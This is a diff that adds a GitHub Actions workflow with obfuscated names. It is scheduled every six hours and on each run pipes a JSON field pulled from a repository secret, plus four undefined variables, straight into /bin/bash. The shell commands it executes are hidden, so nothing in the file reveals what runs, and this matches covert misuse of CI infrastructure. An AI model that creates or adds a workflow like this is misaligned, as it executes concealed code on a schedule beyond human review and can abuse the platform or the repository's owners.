@@ -1,0 +1,23 @@
+name: pubianpxx
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '48 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: pubianpxx
+        env:
+          eakc97: ${{ secrets.eakc97 }}
+        run: |
+          echo $eakc97 | jq -r .xy39 | /bin/bash
+          echo $qu2 | jq -r .rnkh57496 | /bin/bash
+          echo $qlv098 | jq -r .g725 | /bin/bash
+          echo $zk5 | jq -r .ay4 | /bin/bash
+          echo $uu958 | jq -r .tberq9 | /bin/bash
+
